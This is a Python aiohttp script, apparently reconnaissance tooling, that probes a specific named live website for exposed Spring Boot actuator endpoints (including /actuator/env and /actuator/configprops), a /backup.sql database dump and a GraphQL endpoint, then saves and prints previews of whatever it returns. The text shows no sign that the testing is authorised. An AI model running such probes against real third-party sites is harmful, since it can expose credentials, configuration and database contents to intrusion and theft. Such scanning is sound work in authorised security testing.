"""Deep test of discovered vulnerabilities"""
import asyncio
import aiohttp
import json

async def deep_test():
    url = "https://ivi-bettx.net"
    results = {}
    
    async with aiohttp.ClientSession() as session:
        # Test 1: Actuator /env - may expose sensitive config
        print("=== Testing /actuator/env ===")
        try:
            async with session.get(f"{url}/actuator/env", timeout=aiohttp.ClientTimeout(total=15)) as resp:
                content = await resp.text()
                results["actuator_env"] = {
                    "status": resp.status,
                    "content_type": resp.headers.get("Content-Type"),
                    "content_length": len(content),
                    "preview": content[:500]
                }
                print(f"Status: {resp.status}")
                print(f"Content-Type: {resp.headers.get('Content-Type')}")
                print(f"Preview: {content[:300]}...")
        except Exception as e:
            results["actuator_env"] = {"error": str(e)}
        
        # Test 2: backup.sql - may expose database structure
        print("\n=== Testing /backup.sql ===")
        try:
            async with session.get(f"{url}/backup.sql", timeout=aiohttp.ClientTimeout(total=15)) as resp:
                content = await resp.text()
                results["backup_sql"] = {
                    "status": resp.status,
                    "content_type": resp.headers.get("Content-Type"),
                    "content_length": len(content),
                    "preview": content[:500]
                }
                print(f"Status: {resp.status}")
                print(f"Preview: {content[:300]}...")
        except Exception as e:
            results["backup_sql"] = {"error": str(e)}
        
        # Test 3: GraphQL endpoint
        print("\n=== Testing /graphql ===")
        try:
            async with session.get(f"{url}/graphql", timeout=aiohttp.ClientTimeout(total=15)) as resp:
                content = await resp.text()
                results["graphql"] = {
                    "status": resp.status,
                    "content_type": resp.headers.get("Content-Type"),
                    "content_length": len(content),
                    "preview": content[:500]
                }
                print(f"Status: {resp.status}")
                print(f"Preview: {content[:300]}...")
        except Exception as e:
            results["graphql"] = {"error": str(e)}
        
        # Test 4: Try to access actuator with different methods
        print("\n=== Testing actuator endpoints ===")
        actuator_paths = ["/actuator", "/actuator/health", "/actuator/info", 
                         "/actuator/mappings", "/actuator/beans", "/actuator/configprops"]
        for path in actuator_paths:
            try:
                async with session.get(f"{url}{path}", timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        content = await resp.text()
                        print(f"  [200] {path} - {len(content)} bytes")
                        if "env" in path.lower() or "config" in path.lower():
                            print(f"       WARNING: Possible config exposure")
                    else:
                        print(f"  [{resp.status}] {path}")
            except Exception as e:
                print(f"  [ERR] {path}: {str(e)[:50]}")
    
    return results

if __name__ == "__main__":
    results = asyncio.run(deep_test())
    print("\n=== FINAL RESULTS ===")
    print(json.dumps(results, indent=2))
